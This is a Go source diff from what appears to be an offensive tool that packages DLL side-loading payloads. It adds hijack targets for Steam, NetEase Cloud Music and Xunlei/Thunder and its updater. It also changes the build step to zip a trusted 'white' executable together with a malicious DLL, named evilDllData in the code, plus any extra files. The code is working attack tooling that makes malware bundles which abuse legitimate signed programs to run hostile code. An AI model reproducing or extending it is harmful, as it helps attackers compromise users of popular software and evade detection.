@@ -23,18 +23,45 @@ func DllHijackConfig() ([]DllHijackOptionItem) {
 			Name: "(x86) vscode",
 			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackVscode)),
 		},
+		{
+			Type: 2,
+			Name: "(x86) 网易云",
+			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackCloudmusic)),
+		},
+		{
+			Type: 3,
+			Name: "(x86) steam",
+			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackSteam)),
+		},
+		{
+			Type: 4,
+			Name: "(x86) 迅雷升级程序",
+			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackXLLiveUD)),
+		},
+		{
+			Type: 5,
+			Name: "(x86) 迅雷",
+			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackThunder)),
+		},
 	}
 }
 
 // SubPluginPreloadDllHijackX86 给子组件提供编译dll的基础文件
 type SubPluginPreloadDllHijackX86 struct {}
 
+// GetFoundationPath 获取子组件的下级基础文件夹（用来构建dll）
 func (p *SubPluginPreloadDllHijackX86) GetFoundationPath(pluginRootPath string) string {
 	return filepath.Join(pluginRootPath, "preload_dll_hijack_x86")
 }
 
+// GetIsX64Arch 是否为64位
 func (p *SubPluginPreloadDllHijackX86) GetIsX64Arch() (bool) {
 	return false
+}
+
+// GetExtraFileList 获取额外的文件列表，某些情况下exe可能导入的dll不止一个，但我们只对其中一个进行劫持，其他的dll在该列表中体现
+func (p *SubPluginPreloadDllHijackX86) GetExtraFileList() ([]string) {
+	return nil
 }
 
 // PreloadDllHijackBase preload dll劫持插件基础抽象模块
@@ -52,6 +79,7 @@ type SubPluginPreloadDllHijackIface interface {
 	GetPluginName() string
 	GetIsX64Arch() bool
 	GetDllExports() []string
+	GetExtraFileList() ([]string)
 }
 
 // NewPreloadDllHijackBase 根据传入的子组件来创建一个完整的插件
@@ -174,17 +202,27 @@ func (p *PreloadDllHijackBase) Run() ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	// 打包zip
-	files := []utils.FileData{
-		{
-			Name: fmt.Sprintf("%s.dll", p.subplugin.GetDllName()),
-			Body: evilDllData,
-		},
-		{
-			Name: whiteExeName,
-			Body: whiteExeData,
-		},
+	// 读取额外的文件
+	var files []utils.FileData
+	for _, fname := range p.subplugin.GetExtraFileList() {
+		extraFileData, err := ioutil.ReadFile(filepath.Join(tmpDir, fname))
+		if err != nil {
+			return nil, err
+		}
+		files = append(files, utils.FileData {
+			Name: fname,
+			Body: extraFileData,
+		})
 	}
+	// 添加白程序和恶意dll
+	files = append(files, utils.FileData {
+		Name: whiteExeName,
+		Body: whiteExeData,
+	})
+	files = append(files, utils.FileData {
+		Name: fmt.Sprintf("%s.dll", p.subplugin.GetDllName()),
+		Body: evilDllData,
+	})
 	zipPath, err := utils.ZipData(files)
 	if err != nil {
 		return nil, err
